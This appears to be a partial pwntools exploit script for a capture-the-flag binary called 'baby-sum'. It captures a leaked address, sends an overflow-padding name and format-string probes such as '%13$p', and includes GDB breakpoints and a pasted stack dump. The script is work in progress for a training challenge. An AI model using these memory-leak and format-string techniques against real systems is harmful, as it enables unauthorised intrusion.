from pwn import *
import time
binf = ELF("baby-sum")
libc = binf.libc
# libc = ELF('libc-2.31.so')

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
0x555555555312 -> call __isoc99_scanf@plt
0x5555555553ae -> call calc
0x55555555531e -> call calc
'''

gs = '''
break *0x00005555555553ae
break *0x555555555312
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        #return remote("challs.m0lecon.it",1907)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"

# i=1
# while(True):
p=start()

#obtener leak
print(p.recvuntil(b'Here is a very generous leak for you: '))
leak=int(p.recv(14),16)
print('leak =>',hex(leak))

#enviar nombre
p.sendlineafter(b'BTW, what should I call you?\n',b'A'*40+b'CCCCCCCC')
p.recvuntil('Please enter your numbers one by one.\n')
p.sendline('%1$p')
p.sendline('%13$p')
p.sendline('%13$p')



# i=i+1

p.interactive()

# 01:0020│         0x7fffffffde00 ◂— 0x3000000008
# 02:0028│         0x7fffffffde08 ◂— 0xa /* '\n' */
# 03:0030│         0x7fffffffde10 ◂— 0x0
# 04:0038│         0x7fffffffde18 ◂— 0x0
# 05:0040│         0x7fffffffde20 ◂— 0xa /* '\n' */
# 06:00e0│         0x7fffffffdec0 —▸ 0x5555555550e0 (_start) ◂— endbr64 
# 07:00e8│         0x7fffffffdec8 —▸ 0x7fffffffdee0 ◂— 0x64243725 /* '%7$d' */
# 08:00f0│ rbp     0x7fffffffded0 —▸ 0x7fffffffdf10 —▸ 0x7fffffffdf30 ◂— 0x0
# 09:00f8│         0x7fffffffded8 —▸ 0x555555555323 (calc+117) ◂— cmp    qword ptr [rbp - 0x10], 2
# 10:0100│ rdi r10 0x7fffffffdee0 ◂— 0x64243725 /* '%7$d' */
# 11:0108│         0x7fffffffdee8 ◂— 0x0
# 12:0110│         0x7fffffffdef0 ◂— 0x733825 /* '%8s' */
# 13:0118│         0x7fffffffdef8 ◂— 'BBBBBBBB'
# 14:0120│         0x7fffffffdf00 ◂— 0x0
# 15:0128│         0x7fffffffdf08 —▸ 0x7fffffffdee0 ◂— 0x64243725 /* '%7$d' */
# 16:0130│         0x7fffffffdf10 —▸ 0x7fffffffdf30 ◂— 0x0
# 17:0138│         0x7fffffffdf18 —▸ 0x5555555553b3 (main+54) ◂— lea    rdi, [rip + 0xdba]
# 18:0140│         0x7fffffffdf20 ◂— 0x0
